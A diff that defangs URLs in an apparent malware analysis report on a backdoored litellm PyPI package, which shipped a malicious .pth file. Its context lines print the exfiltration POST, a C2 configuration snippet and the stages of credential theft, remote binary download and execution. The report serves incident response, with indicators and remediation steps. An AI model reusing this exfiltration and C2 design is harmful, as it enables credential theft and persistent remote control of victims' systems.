@@ -5,8 +5,8 @@
 **Package:** `litellm==1.82.8` (PyPI)
 **Date of analysis:** 2026-03-24
 **Malicious file:** `litellm_init.pth` (34,628 bytes)
-**Exfiltration endpoint:** `https://models.litellm.cloud/`
-**C2 endpoint:** `https://checkmarx.zone/raw`
+**Exfiltration endpoint:** `hxxps[://]models[.]litellm[.]cloud/`
+**C2 endpoint:** `hxxps[://]checkmarx[.]zone/raw`
 
 ---
 
@@ -65,13 +65,13 @@ This spawns a detached child process running the decoded Stage 1 payload. The pa
 4. Encrypt the collected data with AES-256-CBC (PBKDF2) using the session key
 5. Encrypt the session key with the RSA-4096 public key (OAEP padding)
 6. Bundle `payload.enc` + `session.key.enc` into `tpcp.tar.gz`
-7. POST the bundle to https://models.litellm.cloud/ via curl
+7. POST the bundle to hxxps[://]models[.]litellm[.]cloud/ via curl
 ```
 
 ### Exfiltration details
 
 ```
-POST https://models.litellm.cloud/
+POST hxxps[://]models[.]litellm[.]cloud/
 Content-Type: application/octet-stream
 X-Filename: tpcp.tar.gz
 Body: [AES-encrypted credentials + RSA-encrypted session key]
@@ -225,7 +225,7 @@ This effectively turns a single compromised pod into full cluster compromise.
 ### C2 mechanism
 
 ```python
-C_URL = "https://checkmarx.zone/raw"    # C2 server
+C_URL = "hxxps[://]checkmarx[.]zone/raw"    # C2 server
 TARGET = "/tmp/pglog"                     # Downloaded payload path
 STATE = "/tmp/.pg_state"                  # Tracks last downloaded URL
 ```
@@ -234,7 +234,7 @@ STATE = "/tmp/.pg_state"                  # Tracks last downloaded URL
 
 1. **Initial sleep:** 300 seconds (5 minutes) — avoids detection during install
 2. **Polling loop** (every 3000 seconds / ~50 minutes):
-   - Fetches a URL from `https://checkmarx.zone/raw`
+   - Fetches a URL from `hxxps[://]checkmarx[.]zone/raw`
    - If the URL is new (different from last download) and not a `youtube.com` link:
      - Downloads the binary to `/tmp/pglog`
      - Sets it executable (`chmod 755`)
@@ -292,12 +292,12 @@ ANY python invocation (no import needed)
         |       - AES-256-CBC with random session key
         |       - Session key encrypted with RSA-4096 pubkey
         |
-        +---> [Stage 1] Exfiltrates to https://models.litellm.cloud/
+        +---> [Stage 1] Exfiltrates to hxxps[://]models[.]litellm[.]cloud/
                 - POST as tpcp.tar.gz
                 - Only attacker can decrypt (holds RSA privkey)
 
 [Stage 3] Runs persistently as systemd service:
-        - Polls https://checkmarx.zone/raw every ~50 min
+        - Polls hxxps[://]checkmarx[.]zone/raw every ~50 min
         - Downloads and executes arbitrary binaries
         - Provides ongoing remote code execution
 ```
@@ -318,10 +318,8 @@ ANY python invocation (no import needed)
 ### Network
 | Indicator | Purpose |
 |-----------|---------|
-| `https://models.litellm.cloud/` | Credential exfiltration endpoint |
-| `https://checkmarx.zone/raw` | C2 polling endpoint |
-| `169.254.169.254` (IMDS) | AWS metadata credential theft |
-| `169.254.170.2` (ECS) | ECS container credential theft |
+| `hxxps[://]models[.]litellm[.]cloud/` | Credential exfiltration endpoint |
+| `hxxps[://]checkmarx[.]zone/raw` | C2 polling endpoint |
 
 ### Kubernetes
 | Indicator | Description |
@@ -357,4 +355,4 @@ ANY python invocation (no import needed)
 3. **Rotate ALL credentials** on affected systems — SSH keys, cloud IAM, K8s tokens, API keys, DB passwords, registry tokens
 4. **K8s clusters:** Delete `node-setup-*` pods in `kube-system`, check all nodes for persistence
 5. **Audit:** Check auth logs for unauthorized access using stolen credentials
-6. **Network:** Block `models.litellm.cloud` and `checkmarx.zone` at firewall/DNS level
+6. **Network:** Block `models[.]litellm[.]cloud` and `checkmarx[.]zone` at firewall/DNS level
